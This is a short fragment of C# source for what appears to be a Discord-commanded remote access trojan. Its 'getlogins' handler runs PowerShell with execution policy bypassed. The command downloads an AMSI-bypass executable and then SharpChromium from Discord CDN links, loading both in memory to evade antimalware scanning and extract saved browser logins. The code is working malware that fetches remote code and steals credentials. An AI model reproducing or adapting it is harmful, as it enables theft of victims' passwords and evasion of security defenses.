    ...
    internal class Program
    {
        ...
        private static async Task MessageReceived(SocketMessage message)
        {
            ...
            switch (cmd)
            {
                ...
                case "getlogins":
                    {
                        string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/972864676042006598/amsibypass.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, $null);$wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/982929233590501386/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))");
